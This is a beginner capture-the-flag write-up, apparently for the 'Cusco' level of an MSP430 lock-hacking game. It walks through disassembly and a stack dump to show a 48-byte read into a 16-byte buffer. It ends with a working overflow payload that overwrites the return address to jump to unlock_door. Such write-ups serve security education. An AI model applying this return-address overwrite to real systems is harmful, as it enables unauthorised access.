# Cusco

**Difficulty:** Beginner  
**Date Completed:** 10/08/2025

I started this level by inspecting login method:

```asm
4500 <login>
4500:  3150 f0ff      add	#0xfff0, sp
4504:  3f40 7c44      mov	#0x447c "Enter the password to continue.", r15
4508:  b012 a645      call	#0x45a6 <puts>
450c:  3f40 9c44      mov	#0x449c "Remember: passwords are between 8 and 16 characters.", r15
4510:  b012 a645      call	#0x45a6 <puts>
4514:  3e40 3000      mov	#0x30, r14
4518:  0f41           mov	sp, r15
451a:  b012 9645      call	#0x4596 <getsn>
451e:  0f41           mov	sp, r15
4520:  b012 5244      call	#0x4452 <test_password_valid>
4524:  0f93           tst	r15
4526:  0524           jz	$+0xc <login+0x32>
4528:  b012 4644      call	#0x4446 <unlock_door>
452c:  3f40 d144      mov	#0x44d1 "Access granted.", r15
4530:  023c           jmp	$+0x6 <login+0x36>
4532:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
4536:  b012 a645      call	#0x45a6 <puts>
453a:  3150 1000      add	#0x10, sp
453e:  3041           ret
```

And the first thing I see is that before calling `getsn`, `r15` is loaded with a stack pointer, and `r14` is assigned the value `0x30`. This tells me `r15` is the memory location (on the stack) that will hold the user input password, and `r14` is the length of the buffer.

Immediately we can tell that 0x30 = 48 quite a large buffer given that password size constraint is specified between 8 and 16 characters/bytes. This tells me we can likely write past the 16-byte boundary and insert what we want on the stack.

Next step is to step into `getsn` and check the assembly:

```asm
4596 <getsn>
4596:  0e12           push	r14
4598:  0f12           push	r15
459a:  2312           push	#0x2
459c:  b012 4245      call	#0x4542 <INT>
45a0:  3150 0600      add	#0x6, sp
45a4:  3041           ret
```

Simple enough... It just push the params for the interrupt call onto the stack.
So let's inspect the stack right before the INT call (annotated):

```text
> r sp
43e6 0200 ee43 3000 1e45 0000 0000 0000 0000  ...C0..E........
     └─sp └─r15│    │    └─input buffer (43ee)    
               │    └─return address to caller addr=451e (login)
               └─r14
43f6 0000 0000 0000 0000 3c44 3140 0044 1542  ........<D1@.D.B
                         └─some address (443c)
```

So we see `sp`, `r15`, `r14` are the first 3 words on the stack (this is what we're passing to INT call to get user input), followed by the return address `451e` (remember this little-endian) - which is the memory address of the next instruction in `login()` after the call to `getsn`, followed by a 16-byte buffer, which is what `r15` points to (i.e. our input buffer).
Right after the 16-byte input buffer we have something that looks like a memory address `443c`, which is the return address of the call to `login()` from `main()` (i.e. the last return address of the program before the program loops forever and waits to reset).

```asm
4438 <main>
4438:  b012 0045      call	#0x4500 <login>
443c <__stop_progExec__>
443c:  32d0 f000      bis	#0xf0, sr
4440:  fd3f           jmp	$-0x4 <__stop_progExec__+0x0>
```

So if we overflow the input buffer past the 16-bytes, we can write any memory address we want the `pc` to jump to.

In the `login` method I see a call to `unlock_door` at `4528`.

```asm
4528:  b012 4644      call	#0x4446 <unlock_door>
452c:  3f40 d144      mov	#0x44d1 "Access granted.", r15
```

So let's craft our input to be garbage 16-bytes HEX data followed by `2845` (4528 in little endian ordering).

**Solution: in HEX - `<16 bytes of random hex data>2845`.**

```sh
> solve
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa2845
```
